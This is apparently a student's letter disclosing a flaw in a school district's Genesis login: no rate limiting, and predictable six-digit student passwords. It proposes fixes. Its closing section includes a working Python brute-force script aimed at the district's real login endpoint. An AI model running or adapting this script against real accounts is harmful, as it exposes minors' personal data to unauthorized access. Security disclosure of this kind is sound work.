## 🧠 Intro
I am writing to express a concern I have with district password security for the students, as well as to offer some possible solutions to fix this problem.

The [genesis](https://www.genesisedu.com/) login system has vulnerability that allows many possible passwords to be tried very quickly. This could allow someone to fairly easily guess passwords and gain access to student accounts in a matter of minutes. With access to a students password a large amount of personal information is at risk.

## ❓ Why this is a problem
So what, student password are accessible, how is this bad? Well with these passwords being used for both genesis accounts and student google accounts lots of students personal information is accessible. This includes the following (in no particular order)
- Full Name
- Birth Date
- Age
- State ID (whatever that is)
- School name
- Grade
- Attendance
- Grades
- Classes
- Teacher names
- Report Cards
- Forms
- Calendar Events
- Class Zoom Links
- Class Times
- Student Assignments
- Student Files
- Student Emails (of all students)
- YouTube Watch & Search history
- Google Search History
- Google Keep stuff
- Chrome Bookmarks
- Chrome Saved Passwords
- Chrome autofill form data
- Chrome currently open tabs
- Chrome History
- Google Photos
- Google Tasks
- Any Phones / Mobil devises signed in with school google
- Device Details of devices signed in to school google account
- And more

And this is just the information I found through a few minutes of searching through my account. I hope after reading that you are very concerned about the amount of personal information that is basically public (to anyone who cares enough to put a small amount of effort and time into it). Now not only does anybody who cracks someone else's passwords have access to read the information contained in the categories mentioned above, but they can also edit / modify / send information / emails as someone else.

## ✨ Fixes
Now that this problem is known, I wouldn't be very helpful if I didn't suggest some fixes! So here are two simple options to think about.

### 📀 Option 1

One fix for this problem is to use more secure passwords for accounts. Currently, a large amount (not all) of student passwords appear to be formatted like this ⇒ `30####` where the `#`s are any number. This means that for many student passwords only four digits need to be cracked. This is bad because it lowers the time to crack passwords. I have been able to crack my own password with some fairly unoptimized [code](https://github.com/Basicprogrammer10/SchoolPasswordCrack/blob/master/src/SchoolPasswordCrack.py) in only a few minutes. This means all student passwords could be cracked in a few weeks or less.

I think that at certain grade (I would say 6th grade) students could learn how to then make their own secure passwords. Secure passwords have 10 characters made up of letters, numbers and special characters. These passwords should not be able to be seen by teachers or other staff but could be reset if needed. This would be good in terms of current security, but it will also teach students the important skill of making secure passwords.

### 💿 Option 2

Another way to fix this problem is by making some modifications to genesis login system. This is something that would require working with the genesis 'team' to fix but would be *ok* if option 1 is not viable.

Currently, genesis has no rate limit or CAPTCHA witch allows boring brute force attacks (such as this one) to work. Nowadays adding these is extremely easy with the use of external APIs like reCAPTCHA. For information on implementing reCAPTCHA in PHP (I think genesis uses PHP for its backend) check [here](https://developers.google.com/recaptcha/old/docs/php).

### 🌠 Fixes Conclusion
There are of course more options than these two, but I think this is a good start and will hopefully get the district to think more about the security aspect of the services used. Apart, these solutions are ok but if both are used together the school and its students will be made more secure than ever.

## 🛑 Conclusion
With personal information now being an incredibly valuable asset for advertisers, hackers, etc. it is more important than ever to properly secure it. At the moment I believe the district is **not** doing that fully, which puts large amounts of student data at risk. I believe that it is the district's responsibility to securely manage data of students on district required sites / services (like Google classroom and genesis). There is work and change needed to securely manage this data it is important for student information to be protected. By reading this our district is one step closer to bettor security! As I hope you can see from reading this, I really care about security and want to improve the school's technology for not only myself but all other students. I will also be happy to share more information about this if It will be helpful.

Sincerely, Connor Slade

connorslade@bernardsboe.com

## 📅 Extra Details (If you are interested)
Here I will be going over the specific details of how this 'exploit' would work. View the advanced version's [code](https://github.com/Basicprogrammer10/SchoolPasswordCrack/blob/master/src/SchoolPasswordCrack.py) and see it in action [here](https://asciinema.org/a/408164). So this exploit can be preformed manually if you have a lot of time but can be sped up immensely with a bit of code.

At its most basic my script just sends POST requests to `https://parents.genesisedu.com/bernardsboe/sis/j_security_check` with the form data `{"j_password": <PASSWORD>, "j_username": <EMAIL>}` where `<PASSWORD>` is the password to try (ex: 307652 or 300936 etc.) and `<EMAIL>` is the email of the account to crack (ex: connorslade@bernardsboe.com). I found these details by reverse engineering the genesis login API. Below you can see a basic python script that will (slowly) crack a password for the supplied email account. Read the code comments to understand what is happening.

```python
import requests # Import needed module

url = 'https://parents.genesisedu.com/bernardsboe/sis/j_security_check' # define api uri
email = '' # Put student Email here (ex: example@bernardsboe.com)
print(f'[*] Starting Crack for {email}') # Print email to crack

for i in range(9999): # Loop through possible passwords
    toTry = f'30{str(i).zfill(4)}' # Create password to try (ex: 300736)
    print(f'[*] Trying [{toTry}]') # print what password is being tried
    try:
        ses = requests.Session()
        ses.max_redirects = 2
        # put the username and password into a object ready to be send to the api
        dataToSend={"j_password": toTry, "j_username": email}
        # Send data to genesis api as if you clicked login on the login form
        data = ses.post(url, timeout=0.5, data=dataToSend)
        # try the next possible password if server timeouts or has too many redirects
    except (requests.exceptions.TooManyRedirects, requests.exceptions.Timeout):
        continue
    if data.status_code != 200:
        continue
    print(f'\n[*] Complete: {toTry}') # if passwords is correct print it
    break # Exit the loop when the password has been found
```
Watch this script run [here](https://asciinema.org/a/408162). Now this works but is still very slow, however it does a good job showing what is going on without the unnecessary stuff for speed and ease of use. My other version reads config values from a config file then makes use of multi threading to try more passwords in the same amount of time.
